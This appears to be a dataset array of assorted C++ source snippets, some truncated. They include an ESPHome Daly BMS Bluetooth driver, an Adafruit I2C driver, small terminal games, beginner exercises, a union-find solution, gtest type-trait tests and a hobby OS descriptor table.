    "#include \"daly_bms_ble.h\"\n#include \"esphome/core/log.h\"\n#include \"esphome/core/helpers.h\"\n\nnamespace esphome {\nnamespace daly_bms_ble {\n\nstatic const char *const TAG = \"daly_bms_ble\";\n\nstatic const uint16_t DALY_BMS_SERVICE_UUID = 0xFFF0;\nstatic const uint16_t DALY_BMS_NOTIFY_CHARACTERISTIC_UUID = 0xFFF1;\nstatic const uint16_t DALY_BMS_CONTROL_CHARACTERISTIC_UUID = 0xFFF2;\n\nstatic const uint8_t DALY_FRAME_START = 0xD2;\nstatic const uint8_t DALY_FRAME_START2 = 0x03;\n\nstatic const uint8_t DALY_FUNCTION_READ = 0x03;\nstatic const uint8_t DALY_FUNCTION_WRITE = 0x06;\n\nstatic const uint16_t DALY_COMMAND_REQ_STATUS_START = 0x0000;\nstatic const uint16_t DALY_COMMAND_REQ_STATUS_QTY = 0x003E;\n\nstatic const uint8_t DALY_FRAME_LEN_STATUS = 0x7C;\nstatic const uint8_t DALY_FRAME_LEN_SETTINGS = 0x52;\nstatic const uint8_t DALY_FRAME_LEN_VERSIONS = 0x40;\nstatic const uint8_t DALY_FRAME_LEN_PASSWORD = 0x06;\n\nstatic const uint8_t MAX_RESPONSE_SIZE = 129;\n\nstatic const uint8_t ERRORS_SIZE = 8;\nstatic const char *const ERRORS[ERRORS_SIZE] = {\n    \"Total voltage overcharge protection\",   // 0000 0001\n    \"Single voltage overcharge protection\",  // 0000 0010\n    \"Charge overcurrent protection\",         // 0000 0100\n    \"Discharge overcurrent protection\",      // 0000 1000\n    \"Total voltage overdischarge\",           // 0001 0000\n    \"Single voltage overdischarge\",          // 0010 0000\n    \"High temperature protection\",           // 0100 0000\n    \"Short circuit protection\",              // 1000 0000\n};\n\nvoid DalyBmsBle::gattc_event_handler(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if,\n                                     esp_ble_gattc_cb_param_t *param) {\n  switch (event) {\n    case ESP_GATTC_OPEN_EVT: {\n      break;\n    }\n    case ESP_GATTC_DISCONNECT_EVT: {\n      this->node_state = espbt::ClientState::IDLE;\n\n      // this->publish_state_(this->voltage_sensor_, NAN);\n      break;\n    }\n    case ESP_GATTC_SEARCH_CMPL_EVT: {\n      auto *char_notify = this->parent_->get_characteristic(DALY_BMS_SERVICE_UUID, DALY_BMS_NOTIFY_CHARACTERISTIC_UUID);\n      if (char_notify == nullptr) {\n        ESP_LOGE(TAG, \"[%s] No notify service found at device, not an Daly BMS..?\",\n                 this->parent_->address_str().c_str());\n        break;\n      }\n      this->char_notify_handle_ = char_notify->handle;\n\n      auto status = esp_ble_gattc_register_for_notify(this->parent()->get_gattc_if(), this->parent()->get_remote_bda(),\n                                                      char_notify->handle);\n      if (status) {\n        ESP_LOGW(TAG, \"esp_ble_gattc_register_for_notify failed, status=%d\", status);\n      }\n\n      auto *char_command =\n          this->parent_->get_characteristic(DALY_BMS_SERVICE_UUID, DALY_BMS_CONTROL_CHARACTERISTIC_UUID);\n      if (char_command == nullptr) {\n        ESP_LOGE(TAG, \"[%s] No control service found at device, not an Daly BMS..?\",\n                 this->parent_->address_str().c_str());\n        break;\n      }\n      this->char_command_handle_ = char_command->handle;\n      break;\n    }\n    case ESP_GATTC_REG_FOR_NOTIFY_EVT: {\n      this->node_state = espbt::ClientState::ESTABLISHED;\n\n      this->send_command(DALY_FUNCTION_READ, DALY_COMMAND_REQ_STATUS_START, DALY_COMMAND_REQ_STATUS_QTY);\n      break;\n    }\n    case ESP_GATTC_NOTIFY_EVT: {\n      ESP_LOGV(TAG, \"Notification received (handle 0x%02X): %s\", param->notify.handle,\n               format_hex_pretty(param->notify.value, param->notify.value_len).c_str());\n\n      std::vector<uint8_t> data(param->notify.value, param->notify.value + param->notify.value_len);\n\n      this->on_daly_bms_ble_data(data);\n      break;\n    }\n    default:\n      break;\n  }\n}\n\nvoid DalyBmsBle::update() {\n  if (this->node_state != espbt::ClientState::ESTABLISHED) {\n    ESP_LOGW(TAG, \"[%s] Not connected\", this->parent_->address_str().c_str());\n    return;\n  }\n\n  this->send_command(DALY_FUNCTION_READ, DALY_COMMAND_REQ_STATUS_START, DALY_COMMAND_REQ_STATUS_QTY);\n}\n\nvoid DalyBmsBle::on_daly_bms_ble_data(const std::vector<uint8_t> &data) {\n  if (data[0] != DALY_FRAME_START || data[1] != DALY_FRAME_START2 || data.size() > MAX_RESPONSE_SIZE) {\n    ESP_LOGW(TAG, \"Invalid response received: %s\", format_hex_pretty(&data.front(), data.size()).c_str());\n    return;\n  }\n\n  uint8_t frame_len = data.size();\n  uint16_t computed_crc = crc16(data.data(), frame_len - 2);\n  uint16_t remote_crc = uint16_t(data[frame_len - 2]) | (uint16_t(data[frame_len - 1]) << 8);\n  if (computed_crc != remote_crc) {\n    ESP_LOGW(TAG, \"CRC check failed! 0x%04X != 0x%04X\", computed_crc, remote_crc);\n    return;\n  }\n\n  uint8_t frame_type = data[2];  // data length\n\n  switch (frame_type) {\n    case DALY_FRAME_LEN_STATUS:\n      this->decode_status_data_(data);\n      break;\n    case DALY_FRAME_LEN_SETTINGS:\n      this->decode_settings_data_(data);\n      break;\n    case DALY_FRAME_LEN_VERSIONS:\n      this->decode_version_data_(data);\n      break;\n    case DALY_FRAME_LEN_PASSWORD:\n      this->decode_password_data_(data);\n      bre",
    "//Contains the student class\n#include \"Student.h\"\n#include <iostream>\n#include <iomanip>\n\nusing namespace std;\n\n// Constructor\nStudent::Student(string id, double cw, double fe) : ID(id), courseWork(cw), finalExam(fe) {}\n\n// Getters and setters:\nstring Student::getID() { \n    return ID;\n}\ndouble Student::getCourseWork() { \n    return courseWork; }\ndouble Student::getFinalExam() { \n    return finalExam; }\nvoid Student::setCourseWork(double cw) { \n    courseWork = cw; }\nvoid Student::setFinalExam(double fe) { \n    finalExam = fe; }\n\n// Calculate grade from USP Handbook 2024\nstring Student::calculateGrade() {\n    double totalMarks = courseWork + finalExam;\n    if (totalMarks >= 85) return \"A+\";\n    else if (totalMarks >= 78) return \"A\";\n    else if (totalMarks >= 71) return \"B+\";\n    else if (totalMarks >= 64) return \"B\";\n    else if (totalMarks >= 57) return \"C+\";\n    else if (totalMarks >= 50) return \"C\";\n    else return \"F\";\n}\n\n// Display details\nvoid Student::display() {\n    double total = courseWork + finalExam;\n    cout << setw(10) << ID\n        << setw(15) << courseWork\n        << setw(15) << finalExam\n        << setw(10) << total\n        << setw(10) << calculateGrade() << endl;\n}\n",
    "#include<bits/stdc++.h>\n#include<random>\nusing namespace std;\nint a[110][110], n, x;\nmap<long long, int> fib;\nbool vis[110][110], gameover;\nmap<int, string> color, status, means;\nmap<string, int> lang;\nchar cl[10];\nlong long score;\nstring lo, hin, hel;\nifstream flog, fhints, fhelp;\n#ifdef _WIN32\n\t#include<conio.h>\n#else\n\t#include<unistd.h>\n\t#include<termios.h>\n\tchar getch() {\n\t\tchar buf=0;\n\t\ttermios old={0};\n\t\tif(tcgetattr(0, &old)<0) {\n\t\t\tperror(\"tcsetattr()\");\n\t\t}\n\t\told.c_lflag&=~ICANON;\n\t\told.c_lflag&=~ECHO;\n\t\tif(tcsetattr(0, TCSANOW, &old)<0) {\n\t\t\tperror(\"tcsetattr ICANON\");\n\t\t}\n\t\tif(read(0, &buf, 1)<0) {\n\t\t\tperror(\"read()\");\n\t\t}\n\t\told.c_lflag|=ICANON;\n\t\told.c_lflag|=ECHO;\n\t\tif(tcsetattr(0, TCSANOW, &old)<0) {\n\t\t\tperror(\"tcsetattr ~ICANON\");\n\t\t}\n\t\treturn buf;\n\t} \n#endif\nstring hints[110];\nvector<string> help;\nstring yn[5][2]={{\"\u00ca\u00c7\", \"\u00b7\u00f1\"}, \n\t\t\t\t {\"yes\", \"no\"}, \n\t\t\t\t {\"ja\", \"nein\"}};\nvoid init() {\n    map<long long, int> mp;\n    mp[1]=1;\n    for(int i = 2;i<=20;i++) {\n        mp.insert(pair<long long, int>(i, mp[i-1]*2));\n    }\n    for(int i = 1;i<=20;i++) {\n        fib[mp[i]]=i;\n    }\n\tcolor.insert(pair<int, string>(2, \"\\033[48;2;241;196;15m\"));\n    status.insert(pair<int, string>(2, \"CE\"));\n    means.insert(pair<int, string>(2, \"2     CE  \\033[1mC\\033[0mompile \\033[1mE\\033[0mrror\"));\n\tcolor.insert(pair<int, string>(4, \"\\033[48;2;52;152;219m\"));\n    status.insert(pair<int, string>(4, \"JU\"));\n    means.insert(pair<int, string>(4, \"4     JU  \\033[1mJU\\033[0mdging\"));\n\tcolor.insert(pair<int, string>(8, \"\\033[48;2;142;68;173m\"));\n    status.insert(pair<int, string>(8, \"RE\"));\n    means.insert(pair<int, string>(8, \"8     RE  \\033[1mR\\033[0muntime \\033[1mE\\033[0mrror\"));\n\tcolor.insert(pair<int, string>(16, \"\\033[48;2;46;70;140m\"));\n    status.insert(pair<int, string>(16, \"TLE\"));\n    means.insert(pair<int, string>(16, \"16    TLE \\033[1mT\\033[0mime \\033[1mL\\033[0mimit \\033[1mE\\033[0mxceed\"));\n\tcolor.insert(pair<int, string>(32, \"\\033[48;2;46;70;140m\"));\n    status.insert(pair<int, string>(32, \"MLE\"));\n    means.insert(pair<int, string>(32, \"32    MLE \\033[1mM\\033[0memory \\033[1mL\\033[0mimit \\033[1mE\\033[0mxceed\"));\n\tcolor.insert(pair<int, string>(64, \"\\033[48;2;46;70;140m\"));\n    status.insert(pair<int, string>(64, \"ILE\"));\n    means.insert(pair<int, string>(64, \"64    ILE \\033[1mI\\033[0mdleness \\033[1mL\\033[0mimit \\033[1mE\\033[0mxceed\"));\n\tcolor.insert(pair<int, string>(128, \"\\033[48;2;46;70;140m\"));\n    status.insert(pair<int, string>(128, \"OLE\"));\n    means.insert(pair<int, string>(128, \"128   OLE \\033[1mO\\033[0mutput \\033[1mL\\033[0mimit \\033[1mE\\033[0mxceed\"));\n\tcolor.insert(pair<int, string>(256, \"\\033[48;2;70;73;91m\"));\n    status.insert(pair<int, string>(256, \"UKE\"));\n    means.insert(pair<int, string>(256, \"256   UKE \\033[1mU\\033[0mn\\033[1mK\\033[0mnown \\033[1mE\\033[0mrror\"));\n\tcolor.insert(pair<int, string>(512, \"\\033[48;2;231;81;57m\"));\n    status.insert(pair<int, string>(512, \"WA\"));\n    means.insert(pair<int, string>(512, \"512   WA  \\033[1mW\\033[0mrong \\033[1mA\\033[0mnswer\"));\n\tcolor.insert(pair<int, string>(1024, \"\\033[48;2;215;132;40m\"));\n    status.insert(pair<int, string>(1024, \"PC\"));\n    means.insert(pair<int, string>(1024, \"1024  PC  \\033[1mP\\033[0martially \\033[1mC\\033[0morrect\"));\n\tcolor.insert(pair<int, string>(2048, \"\\033[48;2;118;179;104m\"));\n    status.insert(pair<int, string>(2048, \"AC\"));\n    means.insert(pair<int, string>(2048, \"2048  AC  \\033[1mAC\\033[0mcepted\"));\n\tcolor.insert(pair<int, string>(4096, \"\\033[48;2;229;141;134m\"));\n    status.insert(pair<int, string>(4096, \"PE\"));\n    means.insert(pair<int, string>(4096, \"4096  PE  \\033[1mP\\033[0mresentation \\033[1mE\\033[0mrror\"));\n\tcolor.insert(pair<int, string>(8192, \"\\033[48;2;154;105;6m\"));\n    status.insert(pair<int, string>(8192, \"DoJ\"));\n    means.insert(pair<int, string>(8192, \"8192  DoJ \\033[1mD\\033[0menial \\033[1mo\\033[0mf \\033[1mJ\\033[0mudge\"));\n\tcolor.insert(pair<int, string>(16384, \"\\033[48;2;194;188;164m\"));\n    status.insert(pair<int, string>(16384, \"SJE\"));\n    means.insert(pair<int, string>(16384, \"16384 SJE \\033[1mS\\033[0mpacial \\033[1mJ\\033[0mudge \\033[1mE\\033[0mrror\"));\n\tcolor.insert(pair<int, string>(32768, \"\\033[48;2;221;196;49m\"));\n    status.insert(pair<int, string>(32768, \"AU\"));\n    means.insert(pair<int, string>(32768, \"32768 AU  \\033[1mAU\\033[0m\"));\n\tcolor.insert(pair<int, string>(65536, \"\\033[48;2;102;198;255m\"));\n    status.insert(pair<int, string>(65536, \"AK\"));\n    means.insert(pair<int, string>(65536, \"65536 AK  \\033[1mAK\\033[0m\"));\n    lang.insert(pair<string, int>(\"zh\", 0));\n    lang.insert(pair<string, int>(\"en\", 1));\n    lang.insert(pair<string, int>(\"de\", 2));\n}\nvoid prt() {\n    system(cl);\n    cout<<\"\\033[1mscore:\"<<score<<endl;\n    cout<<\"\\033[0m\\033[38;2;12;12;12m\";\n    for(int i = 1;i<=n;i++) {\n        for(int j = 1;j<=n;j++) {\n            cout<<left<<color[a[i][j]]<<setw(3)<<status[a[i][j]]<<\" \\033[0m\\033[38;2;12;12;12m\";\n        }\n        cout<<endl;\n    }\n    cout<<\"\\033[0m\";\n}\nvoid spawn() ",
    "#include<bits/stdc++.h>\n#define endl \"\\n\"\n#define F first \n#define S second \n#define MP make_pair\n#define int long long\n\nusing namespace std;\nusing state = pair<int,int>;\n\nstruct weighted_uf{\n    int n,set_size;\n    vector<state> parent;\n    vector<int> rank;\n    vector<int> cost;\n\n    weighted_uf(int a){\n        n = a;\n        set_size = a;\n        parent.resize(n+1);\n        rank.resize(n+1);\n        cost.resize(n+1);\n        for(int i=1;i<=n;i++){\n            parent[i] = MP(i,0);\n            rank[i] = 1;\n            cost[i] = 0;\n        }\n    }\n\n    state find(int node){\n        if (node != parent[node].F) {\n            int orig_parent = parent[node].F;\n            state root = find(orig_parent);\n            parent[node].F = root.F;\n            cost[node] += parent[orig_parent].S;\n            parent[node].S = cost[node];\n        }\n        return parent[node];\n    }\n\n    void merge(int x, int y, int c){\n        state rootx = find(x);\n        state rooty = find(y);\n\n        if(rootx.F==rooty.F){\n            //they are part of same component\n        }else{\n            if(rank[rootx.F]>rank[rooty.F]){\n                parent[rooty.F] = MP(rootx.F,-c+rootx.S-rooty.S);\n                rank[rootx.F] += rank[rooty.F];\n                cost[rooty.F] = -c+rootx.S-rooty.S;\n            }else{\n                parent[rootx.F] = MP(rooty.F,c-rootx.S+rooty.S);\n                rank[rooty.F] += rank[rootx.F];\n                cost[rootx.F] = c-rootx.S+rooty.S;\n                if (rank[rootx.F] == rank[rooty.F]) {\n                    rank[rooty.F]++;\n                }\n            }\n            set_size--;\n        }\n    }\n\n    int size(){\n        return set_size;\n    }\n};\n\nint n,q;\n\nvoid solve(){\n    cin>>n>>q;\n\n    weighted_uf wuf(n);\n\n    for(int i=0;i<q;i++){\n        int op;\n        cin>>op;\n\n        if(op==0){\n            int x,y,z;\n            cin>>x>>y>>z;\n            wuf.merge(y,x,z);\n        }else{ \n            int x,y;\n            cin>>x>>y;\n\n            state rootx = wuf.find(x);\n            state rooty = wuf.find(y);\n\n            if(rootx.F!=rooty.F){\n                cout<<\"?\"<<endl;\n            }else{\n                cout<<wuf.parent[y].S-wuf.parent[x].S<<endl;\n            }\n        }\n    }\n}\n\nsigned main(){\n    ios_base::sync_with_stdio(0);\n    cin.tie(0);\n    cout.tie(0);\n\n    solve();\n    return 0;\n}",
    "#include <fsi/function_traits.hpp>\n\n#include <gtest/gtest.h>\n\nusing namespace ::testing;\n\nnamespace {\n\ntemplate <typename ... Ts>\nconsteval std::string_view pretty_print()\n{\n    if constexpr (sizeof...(Ts) == 1)\n        return fsi::detail::get_typename<Ts...>();\n    else\n        return fsi::detail::get_typenames<Ts...>();\n}\n\ntemplate <typename Signature, typename ReturnT, typename ... Args>\nconstexpr void verify_function_signature()\n{\n    using traits_t = fsi::detail::function_traits<Signature>;\n\n    EXPECT_TRUE((std::is_same_v<typename traits_t::return_t, ReturnT>))\n        << \"Return types are not the same for \\\"\" << pretty_print<Signature>() << \"\\\"\"\n        << \"\\n  Expected: \" << pretty_print<ReturnT>()\n        << \"\\n  Got: \" << pretty_print<typename traits_t::return_t>();\n\n    EXPECT_EQ(sizeof...(Args), traits_t::arity)\n        << \"Arity is not the same for \\\"\" << pretty_print<Signature>() << \"\\\"\";\n\n    if constexpr (sizeof...(Args) != 0)\n    {\n        constexpr auto compare_args = [] <typename TraitsT, typename ... ExpectedTs, size_t ... Is>(std::index_sequence<Is...>) {\n            constexpr bool match = (std::is_same_v<typename TraitsT::at_args_t<Is>, ExpectedTs> && ...);\n            EXPECT_TRUE(match)\n                << \"Parameter types are not the same for \\\"\" << pretty_print<Signature>() << \"\\\"\"\n                << \"\\n  Expected: \" << pretty_print<ExpectedTs...>()\n                << \"\\n  Got: \" << pretty_print<typename TraitsT::at_args_t<Is>...>();\n        };\n        compare_args.template operator()<traits_t, Args...>(std::index_sequence_for<Args...>{});\n    }\n    else\n    {\n        EXPECT_TRUE((std::is_same_v<typename traits_t::at_args_t<0>, fsi::detail::typelist_err_t>))\n            << \"Parameter types are not the same for \\\"\" << pretty_print<Signature>() << \"\\\"\"\n            << \"\\n  Expected 0 arguments\";\n    }\n}\n\n} // anonymous namespace\n\nTEST(test_function_traits, test_plain_old_function)\n{\n    verify_function_signature<void(int, int), void, int, int>();\n    verify_function_signature<char(std::string_view), char, std::string_view>();\n    verify_function_signature<void(), void>();\n}\n",
    "#include \"Adafruit_I2CDevice.h\"\n\n//#define DEBUG_SERIAL Serial\n\n/*!\n *    @brief  Create an I2C device at a given address\n *    @param  addr The 7-bit I2C address for the device\n *    @param  theWire The I2C bus to use, defaults to &Wire\n */\nAdafruit_I2CDevice::Adafruit_I2CDevice(uint8_t addr, TwoWire *theWire) {\n  _addr = addr;\n  _wire = theWire;\n  _begun = false;\n#ifdef ARDUINO_ARCH_SAMD\n  _maxBufferSize = 250; // as defined in Wire.h's RingBuffer\n#elif defined(ESP32)\n  _maxBufferSize = I2C_BUFFER_LENGTH;\n#else\n  _maxBufferSize = 32;\n#endif\n}\n\n/*!\n *    @brief  Initializes and does basic address detection\n *    @param  addr_detect Whether we should attempt to detect the I2C address\n * with a scan. 99% of sensors/devices don't mind but once in a while, they spaz\n * on a scan!\n *    @return True if I2C initialized and a device with the addr found\n */\nbool Adafruit_I2CDevice::begin(bool addr_detect) {\n  _wire->begin();\n  _begun = true;\n\n  if (addr_detect) {\n    return detected();\n  }\n  return true;\n}\n\n/*!\n *    @brief  De-initialize device, turn off the Wire interface\n */\nvoid Adafruit_I2CDevice::end(void) {\n  // Not all port implement Wire::end(), such as\n  // - ESP8266\n  // - AVR core without WIRE_HAS_END\n  // - ESP32: end() is implemented since 2.0.1 which is latest at the moment.\n  // Temporarily disable for now to give time for user to update.\n#if !(defined(ESP8266) ||                                                      \\\n      (defined(ARDUINO_ARCH_AVR) && !defined(WIRE_HAS_END)) ||                 \\\n      defined(ARDUINO_ARCH_ESP32))\n  _wire->end();\n  _begun = false;\n#endif\n}\n\n/*!\n *    @brief  Scans I2C for the address - note will give a false-positive\n *    if there's no pullups on I2C\n *    @return True if I2C initialized and a device with the addr found\n */\nbool Adafruit_I2CDevice::detected(void) {\n  // Init I2C if not done yet\n  if (!_begun && !begin()) {\n    return false;\n  }\n\n  // A basic scanner, see if it ACK's\n  _wire->beginTransmission(_addr);\n  if (_wire->endTransmission() == 0) {\n#ifdef DEBUG_SERIAL\n    DEBUG_SERIAL.println(F(\"Detected\"));\n#endif\n    return true;\n  }\n#ifdef DEBUG_SERIAL\n  DEBUG_SERIAL.println(F(\"Not detected\"));\n#endif\n  return false;\n}\n\n/*!\n *    @brief  Write a buffer or two to the I2C device. Cannot be more than\n * maxBufferSize() bytes.\n *    @param  buffer Pointer to buffer of data to write. This is const to\n *            ensure the content of this buffer doesn't change.\n *    @param  len Number of bytes from buffer to write\n *    @param  prefix_buffer Pointer to optional array of data to write before\n * buffer. Cannot be more than maxBufferSize() bytes. This is const to\n *            ensure the content of this buffer doesn't change.\n *    @param  prefix_len Number of bytes from prefix buffer to write\n *    @param  stop Whether to send an I2C STOP signal on write\n *    @return True if write was successful, otherwise false.\n */\nbool Adafruit_I2CDevice::write(const uint8_t *buffer, size_t len, bool stop,\n                               const uint8_t *prefix_buffer,\n                               size_t prefix_len) {\n  if ((len + prefix_len) > maxBufferSize()) {\n    // currently not guaranteed to work if more than 32 bytes!\n    // we will need to find out if some platforms have larger\n    // I2C buffer sizes :/\n#ifdef DEBUG_SERIAL\n    DEBUG_SERIAL.println(F(\"\\tI2CDevice could not write such a large buffer\"));\n#endif\n    return false;\n  }\n\n  _wire->beginTransmission(_addr);\n\n  // Write the prefix data (usually an address)\n  if ((prefix_len != 0) && (prefix_buffer != nullptr)) {\n    if (_wire->write(prefix_buffer, prefix_len) != prefix_len) {\n#ifdef DEBUG_SERIAL\n      DEBUG_SERIAL.println(F(\"\\tI2CDevice failed to write\"));\n#endif\n      return false;\n    }\n  }\n\n  // Write the data itself\n  if (_wire->write(buffer, len) != len) {\n#ifdef DEBUG_SERIAL\n    DEBUG_SERIAL.println(F(\"\\tI2CDevice failed to write\"));\n#endif\n    return false;\n  }\n\n#ifdef DEBUG_SERIAL\n\n  DEBUG_SERIAL.print(F(\"\\tI2CWRITE @ 0x\"));\n  DEBUG_SERIAL.print(_addr, HEX);\n  DEBUG_SERIAL.print(F(\" :: \"));\n  if ((prefix_len != 0) && (prefix_buffer != nullptr)) {\n    for (uint16_t i = 0; i < prefix_len; i++) {\n      DEBUG_SERIAL.print(F(\"0x\"));\n      DEBUG_SERIAL.print(prefix_buffer[i], HEX);\n      DEBUG_SERIAL.print(F(\", \"));\n    }\n  }\n  for (uint16_t i = 0; i < len; i++) {\n    DEBUG_SERIAL.print(F(\"0x\"));\n    DEBUG_SERIAL.print(buffer[i], HEX);\n    DEBUG_SERIAL.print(F(\", \"));\n    if (i % 32 == 31) {\n      DEBUG_SERIAL.println();\n    }\n  }\n\n  if (stop) {\n    DEBUG_SERIAL.print(\"\\tSTOP\");\n  }\n#endif\n\n  if (_wire->endTransmission(stop) == 0) {\n#ifdef DEBUG_SERIAL\n    DEBUG_SERIAL.println();\n    // DEBUG_SERIAL.println(\"Sent!\");\n#endif\n    return true;\n  } else {\n#ifdef DEBUG_SERIAL\n    DEBUG_SERIAL.println(\"\\tFailed to send!\");\n#endif\n    return false;\n  }\n}\n\n/*!\n *    @brief  Read from I2C into a buffer from the I2C device.\n *    Cannot be more than maxBufferSize() bytes.\n *    @param  buffer Pointer to buffer of",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nchar board[3][3] = {{'1', '2', '3'}, {'4', '5', '6'}, {'7', '8', '9'}};\r\nchar currentMarker;\r\nint currentPlayer;\r\n\r\nvoid drawBoard() {\r\n    system(\"clear\"); // Use \"system(\"CLS\")\" for Windows\r\n    cout << \"Player 1 (X)  -  Player 2 (O)\" << endl;\r\n    cout << endl;\r\n    cout << \"     |     |     \" << endl;\r\n    cout << \"  \" << board[0][0] << \"  |  \" << board[0][1] << \"  |  \" << board[0][2] << endl;\r\n    cout << \"_____|_____|_____\" << endl;\r\n    cout << \"     |     |     \" << endl;\r\n    cout << \"  \" << board[1][0] << \"  |  \" << board[1][1] << \"  |  \" << board[1][2] << endl;\r\n    cout << \"_____|_____|_____\" << endl;\r\n    cout << \"     |     |     \" << endl;\r\n    cout << \"  \" << board[2][0] << \"  |  \" << board[2][1] << \"  |  \" << board[2][2] << endl;\r\n    cout << \"     |     |     \" << endl;\r\n    cout << endl;\r\n}\r\n\r\nbool placeMarker(int slot) {\r\n    int row = (slot - 1) / 3;\r\n    int col = (slot - 1) % 3;\r\n    if (board[row][col] != 'X' && board[row][col] != 'O') {\r\n        board[row][col] = currentMarker;\r\n        return true;\r\n    } else {\r\n        return false;\r\n    }\r\n}\r\n\r\nint checkWinner() {\r\n    // Rows\r\n    for (int i = 0; i < 3; i++)\r\n        if (board[i][0] == board[i][1] && board[i][1] == board[i][2])\r\n            return currentPlayer;\r\n    // Columns\r\n    for (int i = 0; i < 3; i++)\r\n        if (board[0][i] == board[1][i] && board[1][i] == board[2][i])\r\n            return currentPlayer;\r\n    // Diagonals\r\n    if ((board[0][0] == board[1][1] && board[1][1] == board[2][2]) ||\r\n        (board[0][2] == board[1][1] && board[1][1] == board[2][0]))\r\n        return currentPlayer;\r\n\r\n    return 0;\r\n}\r\n\r\nvoid switchPlayer() {\r\n    currentPlayer = (currentPlayer == 1) ? 2 : 1;\r\n    currentMarker = (currentMarker == 'X') ? 'O' : 'X';\r\n}\r\n\r\nvoid game() {\r\n    currentPlayer = 1;\r\n    currentMarker = 'X';\r\n    int winner = 0;\r\n    int slot;\r\n\r\n    drawBoard();\r\n    for (int i = 0; i < 9; i++) {\r\n        cout << \"Player \" << currentPlayer << \", enter your slot: \";\r\n        cin >> slot;\r\n        if (slot < 1 || slot > 9 || !placeMarker(slot)) {\r\n            cout << \"Invalid move. Try again.\" << endl;\r\n            i--;\r\n            continue;\r\n        }\r\n        drawBoard();\r\n        winner = checkWinner();\r\n        if (winner) {\r\n            cout << \"Player \" << winner << \" wins!\" << endl;\r\n            break;\r\n        }\r\n        switchPlayer();\r\n    }\r\n\r\n    if (winner == 0) {\r\n        cout << \"It's a draw!\" << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    char playAgain;\r\n    do {\r\n        for (int i = 0; i < 3; i++) // Reset the board\r\n            for (int j = 0; j < 3; j++)\r\n                board[i][j] = '1' + (i * 3 + j);\r\n        game();\r\n        cout << \"Do you want to play again? (Y/N): \";\r\n        cin >> playAgain;\r\n    } while (playAgain == 'Y' || playAgain == 'y');\r\n\r\n    return 0;\r\n}\r\n",
    "#include<iostream>\nusing namespace std;\n                             //sum of two numbers\n  /* int sum(int a, int b)\n   {\n     int s = a + b ;\n    return s;\n}\nint main()\n{\n    cout<<sum(10,5);\n    return 0 ;\n} */\n                          //sum of N numbers\n/* int SumofN(int n ){\n     int sum = 0;\n     for(int i = 0 ; i <=n; i++)\n     {\n        sum+=i;\n     }\n     return sum ;\n}\nint main()\n{\n    cout<<SumofN(7);\n    return 0 ;\n} */\n                   //calculate N fictorial\n/* int fictorial(int n)\n{\n   int fact = 1 ;\n   for(int i = 1 ; i <=n; i++)\n     {\n        fact   *= i;\n     }\n     return fact ;\n}\nint main()\n{\n    cout<<fictorial(5);\n    return 0 ;\n} */\n                        //calculate the sum of the digits of the number\n/*int sumofdigits(int num )\n{\n    int digsum = 0 ;\n    while(num>0){\n   int lastdig = num%10;\n   num/=10;\n   digsum += lastdig;\n    }\n    return digsum;\n}\n\n int main(){\n cout<<sumofdigits(1234);\n return 0 ;\n }      */\n                      //calculate nCr of binomial coeffient of n and r\n /* int fictorial(int n)\n{\n   int fact = 1 ;\n   for(int i = 1 ; i <=n; i++)\n     {\n        fact   *= i;\n     }\n     return fact ;\n}\nint nCr(int n , int r){\n    int fact_n = fictorial(n);\n     int fact_r = fictorial(r);\n      int fact_nr = fictorial(n-r);\n      return fact_n/(fact_r * fact_nr) ;\n}\nint main()\n{\n    int n =8 ,  r=4 ;\n   cout<<nCr(n , r);\n\n    return 0 ;\n    }                                       */\n                  //function to check if a number is prime of not \n\n/*bool Nprime(int n) {\n    if (n <= 1) return false;  // Numbers less than or equal to 1 are not prime\n    for (int i = 2; i <= n-1; i++) {  // Check up to n-1\n        if (n % i == 0) {\n            return false;  // If divisible by any number other than 1 and itself, not prime\n        }\n    }\n    return true;  // If no divisors found, the number is prime\n}\n\nint main() {\n    int num = 6;  // You can change this to test with different numbers\n    if (Nprime(num)) {\n        cout << \"The number is prime\" << endl;\n    } else {\n        cout << \"The number is not prime\" << endl;\n    }\n    return 0;\n} */\n             //function to print all prime number from 2 to n\n/*bool isPrime(int num) {\n    if (num <= 1) return false;  \n    for (int i = 2; i <= num-1 ; i++) {  \n        if (num % i == 0) {\n            return false;  \n        }\n    }\n    return true;  \n}\nvoid Allprime(int n) {\n    for (int i = 2; i <= n; i++) { \n        if (isPrime(i)) {  \n            cout << i << \" \"; \n        }\n    }\n    cout << endl;  \n}\nint main(){\n    int n;\n    cout << \"Enter a number: \";\n    cin >> n;  \n    cout << \"Prime numbers from 2 to \" << n << \": \";\n    Allprime(n);  // Call the function to display all prime numbers up to n\n    return 0;\n} */",
    "#include <gdt.h>\n\nusing namespace jackos;\nusing namespace jackos::common;\n\nGlobalDescriptorTable::GlobalDescriptorTable()\n: nullSegmentSelector(0, 0, 0),\nunusedSegmentSelector(0, 0, 0),\ncodeSegmentSelector(0, 64*1024*1024, 0x9A),\ndataSegmentSelector(0, 64*1024*1024, 0x92)\n{\n    uint32_t i[2];\n    i[1] = (uint32_t)this;\n    i[0] = sizeof(GlobalDescriptorTable) << 16;\n\n    asm volatile(\"lgdt (%0)\": :\"p\" (((uint8_t *) i) + 2));\n}\n\nGlobalDescriptorTable::~GlobalDescriptorTable() {\n    \n}\n\nuint16_t GlobalDescriptorTable::DataSegmentSelector() {\n    return (uint8_t *)&dataSegmentSelector - (uint8_t*)this;\n}\n\nuint16_t GlobalDescriptorTable::CodeSegmentSelector() {\n    return (uint8_t *)&codeSegmentSelector - (uint8_t*)this;\n}\n\nGlobalDescriptorTable::SegmentDescriptor::SegmentDescriptor(uint32_t base, uint32_t limit, uint8_t flags) {\n    uint8_t* target = (uint8_t*)this;\n\n    if(limit <= 65536) {\n        target[6] = 0x40;\n    }\n    else {\n        if((limit & 0xFFF) != 0xFFF) {\n            limit = (limit >> 12) - 1;\n        }\n        else {\n            limit = (limit >> 12);\n        }\n        target[6] = 0xC0;\n    }\n    target[0] = limit & 0xFF;\n    target[1] = limit >> 8 & 0xFF;\n    target[6] |= (limit >> 16) & 0xF;\n    target[2] = base & 0xFF;\n    target[3] = (base >> 8) & 0xFF;\n    target[4] = (base >> 16) & 0xFF;\n    target[7] = (base >> 24) & 0xFF;\n    target[5] = flags;\n}\n\nuint32_t GlobalDescriptorTable::SegmentDescriptor::Base() {\n    uint8_t* target = (uint8_t*)this;\n    uint32_t result = target[7];\n    result = (result << 8) + target[4];\n    result = (result << 8) + target[3];\n    result = (result << 8) + target[2];\n    return 